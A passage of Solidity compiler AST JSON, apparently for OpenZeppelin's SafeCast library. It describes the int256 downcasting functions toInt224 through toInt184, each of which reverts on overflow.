referencedDeclaration":4688,"src":"19452:10:7","typeDescriptions":{"typeIdentifier":"t_int224","typeString":"int224"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":4698,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4685,"src":"19466:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"19452:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4706,"nodeType":"IfStatement","src":"19448:98:7","trueBody":{"id":4705,"nodeType":"Block","src":"19473:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"323234","id":4701,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"19524:3:7","typeDescriptions":{"typeIdentifier":"t_rational_224_by_1","typeString":"int_const 224"},"value":"224"},{"id":4702,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4685,"src":"19529:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_224_by_1","typeString":"int_const 224"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4700,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"19494:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":4703,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"19494:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4704,"nodeType":"RevertStatement","src":"19487:48:7"}]}}]},"documentation":{"id":4683,"nodeType":"StructuredDocumentation","src":"19011:312:7","text":" @dev Returns the downcasted int224 from int256, reverting on\n overflow (when the input is less than smallest int224 or\n greater than largest int224).\n Counterpart to Solidity's `int224` operator.\n Requirements:\n - input must fit into 224 bits"},"id":4708,"implemented":true,"kind":"function","modifiers":[],"name":"toInt224","nameLocation":"19337:8:7","nodeType":"FunctionDefinition","parameters":{"id":4686,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4685,"mutability":"mutable","name":"value","nameLocation":"19353:5:7","nodeType":"VariableDeclaration","scope":4708,"src":"19346:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4684,"name":"int256","nodeType":"ElementaryTypeName","src":"19346:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"19345:14:7"},"returnParameters":{"id":4689,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4688,"mutability":"mutable","name":"downcasted","nameLocation":"19390:10:7","nodeType":"VariableDeclaration","scope":4708,"src":"19383:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int224","typeString":"int224"},"typeName":{"id":4687,"name":"int224","nodeType":"ElementaryTypeName","src":"19383:6:7","typeDescriptions":{"typeIdentifier":"t_int224","typeString":"int224"}},"visibility":"internal"}],"src":"19382:19:7"},"scope":5451,"src":"19328:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4733,"nodeType":"Block","src":"19949:150:7","statements":[{"expression":{"id":4721,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":4716,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4714,"src":"19959:10:7","typeDescriptions":{"typeIdentifier":"t_int216","typeString":"int216"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":4719,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4711,"src":"19979:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4718,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"19972:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int216_$","typeString":"type(int216)"},"typeName":{"id":4717,"name":"int216","nodeType":"ElementaryTypeName","src":"19972:6:7","typeDescriptions":{}}},"id":4720,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"19972:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int216","typeString":"int216"}},"src":"19959:26:7","typeDescriptions":{"typeIdentifier":"t_int216","typeString":"int216"}},"id":4722,"nodeType":"ExpressionStatement","src":"19959:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4725,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4723,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4714,"src":"19999:10:7","typeDescriptions":{"typeIdentifier":"t_int216","typeString":"int216"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":4724,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4711,"src":"20013:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"19999:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4732,"nodeType":"IfStatement","src":"19995:98:7","trueBody":{"id":4731,"nodeType":"Block","src":"20020:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"323136","id":4727,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"20071:3:7","typeDescriptions":{"typeIdentifier":"t_rational_216_by_1","typeString":"int_const 216"},"value":"216"},{"id":4728,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4711,"src":"20076:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_216_by_1","typeString":"int_const 216"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4726,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"20041:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":4729,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"20041:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4730,"nodeType":"RevertStatement","src":"20034:48:7"}]}}]},"documentation":{"id":4709,"nodeType":"StructuredDocumentation","src":"19558:312:7","text":" @dev Returns the downcasted int216 from int256, reverting on\n overflow (when the input is less than smallest int216 or\n greater than largest int216).\n Counterpart to Solidity's `int216` operator.\n Requirements:\n - input must fit into 216 bits"},"id":4734,"implemented":true,"kind":"function","modifiers":[],"name":"toInt216","nameLocation":"19884:8:7","nodeType":"FunctionDefinition","parameters":{"id":4712,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4711,"mutability":"mutable","name":"value","nameLocation":"19900:5:7","nodeType":"VariableDeclaration","scope":4734,"src":"19893:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4710,"name":"int256","nodeType":"ElementaryTypeName","src":"19893:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"19892:14:7"},"returnParameters":{"id":4715,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4714,"mutability":"mutable","name":"downcasted","nameLocation":"19937:10:7","nodeType":"VariableDeclaration","scope":4734,"src":"19930:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int216","typeString":"int216"},"typeName":{"id":4713,"name":"int216","nodeType":"ElementaryTypeName","src":"19930:6:7","typeDescriptions":{"typeIdentifier":"t_int216","typeString":"int216"}},"visibility":"internal"}],"src":"19929:19:7"},"scope":5451,"src":"19875:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4759,"nodeType":"Block","src":"20496:150:7","statements":[{"expression":{"id":4747,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":4742,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4740,"src":"20506:10:7","typeDescriptions":{"typeIdentifier":"t_int208","typeString":"int208"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":4745,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4737,"src":"20526:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4744,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"20519:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int208_$","typeString":"type(int208)"},"typeName":{"id":4743,"name":"int208","nodeType":"ElementaryTypeName","src":"20519:6:7","typeDescriptions":{}}},"id":4746,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"20519:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int208","typeString":"int208"}},"src":"20506:26:7","typeDescriptions":{"typeIdentifier":"t_int208","typeString":"int208"}},"id":4748,"nodeType":"ExpressionStatement","src":"20506:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4751,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4749,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4740,"src":"20546:10:7","typeDescriptions":{"typeIdentifier":"t_int208","typeString":"int208"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":4750,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4737,"src":"20560:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"20546:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4758,"nodeType":"IfStatement","src":"20542:98:7","trueBody":{"id":4757,"nodeType":"Block","src":"20567:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"323038","id":4753,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"20618:3:7","typeDescriptions":{"typeIdentifier":"t_rational_208_by_1","typeString":"int_const 208"},"value":"208"},{"id":4754,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4737,"src":"20623:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_208_by_1","typeString":"int_const 208"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4752,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"20588:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":4755,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"20588:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4756,"nodeType":"RevertStatement","src":"20581:48:7"}]}}]},"documentation":{"id":4735,"nodeType":"StructuredDocumentation","src":"20105:312:7","text":" @dev Returns the downcasted int208 from int256, reverting on\n overflow (when the input is less than smallest int208 or\n greater than largest int208).\n Counterpart to Solidity's `int208` operator.\n Requirements:\n - input must fit into 208 bits"},"id":4760,"implemented":true,"kind":"function","modifiers":[],"name":"toInt208","nameLocation":"20431:8:7","nodeType":"FunctionDefinition","parameters":{"id":4738,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4737,"mutability":"mutable","name":"value","nameLocation":"20447:5:7","nodeType":"VariableDeclaration","scope":4760,"src":"20440:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4736,"name":"int256","nodeType":"ElementaryTypeName","src":"20440:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"20439:14:7"},"returnParameters":{"id":4741,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4740,"mutability":"mutable","name":"downcasted","nameLocation":"20484:10:7","nodeType":"VariableDeclaration","scope":4760,"src":"20477:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int208","typeString":"int208"},"typeName":{"id":4739,"name":"int208","nodeType":"ElementaryTypeName","src":"20477:6:7","typeDescriptions":{"typeIdentifier":"t_int208","typeString":"int208"}},"visibility":"internal"}],"src":"20476:19:7"},"scope":5451,"src":"20422:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4785,"nodeType":"Block","src":"21043:150:7","statements":[{"expression":{"id":4773,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":4768,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4766,"src":"21053:10:7","typeDescriptions":{"typeIdentifier":"t_int200","typeString":"int200"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":4771,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4763,"src":"21073:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4770,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"21066:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int200_$","typeString":"type(int200)"},"typeName":{"id":4769,"name":"int200","nodeType":"ElementaryTypeName","src":"21066:6:7","typeDescriptions":{}}},"id":4772,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"21066:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int200","typeString":"int200"}},"src":"21053:26:7","typeDescriptions":{"typeIdentifier":"t_int200","typeString":"int200"}},"id":4774,"nodeType":"ExpressionStatement","src":"21053:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4777,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4775,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4766,"src":"21093:10:7","typeDescriptions":{"typeIdentifier":"t_int200","typeString":"int200"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":4776,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4763,"src":"21107:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"21093:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4784,"nodeType":"IfStatement","src":"21089:98:7","trueBody":{"id":4783,"nodeType":"Block","src":"21114:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"323030","id":4779,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"21165:3:7","typeDescriptions":{"typeIdentifier":"t_rational_200_by_1","typeString":"int_const 200"},"value":"200"},{"id":4780,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4763,"src":"21170:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_200_by_1","typeString":"int_const 200"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4778,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"21135:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":4781,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"21135:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4782,"nodeType":"RevertStatement","src":"21128:48:7"}]}}]},"documentation":{"id":4761,"nodeType":"StructuredDocumentation","src":"20652:312:7","text":" @dev Returns the downcasted int200 from int256, reverting on\n overflow (when the input is less than smallest int200 or\n greater than largest int200).\n Counterpart to Solidity's `int200` operator.\n Requirements:\n - input must fit into 200 bits"},"id":4786,"implemented":true,"kind":"function","modifiers":[],"name":"toInt200","nameLocation":"20978:8:7","nodeType":"FunctionDefinition","parameters":{"id":4764,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4763,"mutability":"mutable","name":"value","nameLocation":"20994:5:7","nodeType":"VariableDeclaration","scope":4786,"src":"20987:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4762,"name":"int256","nodeType":"ElementaryTypeName","src":"20987:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"20986:14:7"},"returnParameters":{"id":4767,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4766,"mutability":"mutable","name":"downcasted","nameLocation":"21031:10:7","nodeType":"VariableDeclaration","scope":4786,"src":"21024:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int200","typeString":"int200"},"typeName":{"id":4765,"name":"int200","nodeType":"ElementaryTypeName","src":"21024:6:7","typeDescriptions":{"typeIdentifier":"t_int200","typeString":"int200"}},"visibility":"internal"}],"src":"21023:19:7"},"scope":5451,"src":"20969:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4811,"nodeType":"Block","src":"21590:150:7","statements":[{"expression":{"id":4799,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":4794,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4792,"src":"21600:10:7","typeDescriptions":{"typeIdentifier":"t_int192","typeString":"int192"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":4797,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4789,"src":"21620:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4796,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"21613:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int192_$","typeString":"type(int192)"},"typeName":{"id":4795,"name":"int192","nodeType":"ElementaryTypeName","src":"21613:6:7","typeDescriptions":{}}},"id":4798,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"21613:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int192","typeString":"int192"}},"src":"21600:26:7","typeDescriptions":{"typeIdentifier":"t_int192","typeString":"int192"}},"id":4800,"nodeType":"ExpressionStatement","src":"21600:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4803,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4801,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4792,"src":"21640:10:7","typeDescriptions":{"typeIdentifier":"t_int192","typeString":"int192"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":4802,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4789,"src":"21654:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"21640:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4810,"nodeType":"IfStatement","src":"21636:98:7","trueBody":{"id":4809,"nodeType":"Block","src":"21661:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313932","id":4805,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"21712:3:7","typeDescriptions":{"typeIdentifier":"t_rational_192_by_1","typeString":"int_const 192"},"value":"192"},{"id":4806,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4789,"src":"21717:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_192_by_1","typeString":"int_const 192"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4804,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"21682:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":4807,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"21682:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4808,"nodeType":"RevertStatement","src":"21675:48:7"}]}}]},"documentation":{"id":4787,"nodeType":"StructuredDocumentation","src":"21199:312:7","text":" @dev Returns the downcasted int192 from int256, reverting on\n overflow (when the input is less than smallest int192 or\n greater than largest int192).\n Counterpart to Solidity's `int192` operator.\n Requirements:\n - input must fit into 192 bits"},"id":4812,"implemented":true,"kind":"function","modifiers":[],"name":"toInt192","nameLocation":"21525:8:7","nodeType":"FunctionDefinition","parameters":{"id":4790,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4789,"mutability":"mutable","name":"value","nameLocation":"21541:5:7","nodeType":"VariableDeclaration","scope":4812,"src":"21534:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4788,"name":"int256","nodeType":"ElementaryTypeName","src":"21534:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"21533:14:7"},"returnParameters":{"id":4793,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4792,"mutability":"mutable","name":"downcasted","nameLocation":"21578:10:7","nodeType":"VariableDeclaration","scope":4812,"src":"21571:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int192","typeString":"int192"},"typeName":{"id":4791,"name":"int192","nodeType":"ElementaryTypeName","src":"21571:6:7","typeDescriptions":{"typeIdentifier":"t_int192","typeString":"int192"}},"visibility":"internal"}],"src":"21570:19:7"},"scope":5451,"src":"21516:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4837,"nodeType":"Block","src":"22137:150:7","statements":[{"expression":{"id":4825,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":4820,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4818,"src":"22147:10:7","typeDescriptions":{"typeIdentifier":"t_int184","typeString":"int184"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":4823,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4815,"src":"22167:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4822,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"22160:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int184_$","typeString":"type(int184)"},"typeName":{"id":4821,"name":"int184","nodeType":"ElementaryTypeName","src":"22160:6:7","typeDescriptions":{}}},"id":4824,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"22160:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int184","typeString":"int184"}},"src":"22147:26:7","typeDescriptions":{"typeIdentifier":"t_int184","typeString":"int184"}},"id":4826,"nodeType":"ExpressionStatement","src":"22147:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":4829,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4827,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4818,"src":"22187:10:7","typeDescriptions":{"typeIdentifier":"t_int184","typeString":"int184"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":4828,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4815,"src":"22201:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"22187:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4836,"nodeType":"IfStatement","src":"22183:98:7","trueBody":{"id":4835,"nodeType":"Block","src":"22208:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313834","id":4831,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"22259:3:7","typeDescriptions":{"typeIdentifier":"t_rational_184_by_1","typeString":"int_const 184"},"value":"184"},{"id":4832,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4815,"src":"22264:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_184_by_1","typeString":"int_const 184"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4830,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"22229:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":4833,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"22229:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4834,"nodeType":"RevertStatement","src":"22222:48:7"}]}}]},"documentation":{"id":4813,"nodeType":"StructuredDocumentation","src":"21746:312:7","text":" @dev Returns the downcasted int184 from int256, reverting on\n overflow (when the input is less than smallest int184 or\n greater than largest int184).\n Counterpart to Solidity's `int184` operator.\n Requirements:\n - input must fit into 184 bits"},"id":4838,"implemented":true,"kind":"function","modifiers":[],"name":"toInt184","nameLocation":"22072:8:7","nodeType":"FunctionDefinition","parameters":{"id":4816,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4815,"mutability":"mutable","name":"value","nameLocation":"22088:5:7","nodeType":"VariableDeclaration","scope":4838,"src":"22081:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4814,"name":"int256","nodeType":"ElementaryTypeName","src":"22081:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"22080:14:7"},"returnParameters":{"id":4819,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4818,"mutability":"mutable","name":"downcasted","nameLocation":"22125:10:7","nodeType":"VariableDeclaration","scope":4838,"src":"22118:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int184","typeString":"int184"},"typeName":{"id":4817,"name":"int184","nodeType":"ElementaryTypeName","src":"22118:6:7","typeDescriptions":{"typeIdentifier":"t_int184","typeString":"int184"}},"visibility":"internal"}],"src":"22117:19:7"},"scope":5451,"src":"22063:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4863,"nodeType":"Block","src":"22684:150:7","statements":[{"expression":{"id":4851,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":4846,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4844,"src":"22694:10:7","typeDescriptions":{"typeIdentifier":"t_int176","typeString":"int176"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":4849,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4841,"src":"22714:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":4848,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"22707:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int176_$","typeString":"type(int176)"},"typeName":{"id":4847,"name":"int176","nodeType":"ElementaryTypeName","src":"22707:6:7","typeDescriptions":{}}},"id":4850,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"22707:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int176","typeString":"int176"}},"src":"22694:26:7","typeDescriptions":{"typeIdentifier":"t_int176","typeString":"int176"}},"id":4852,"nodeType":"Expression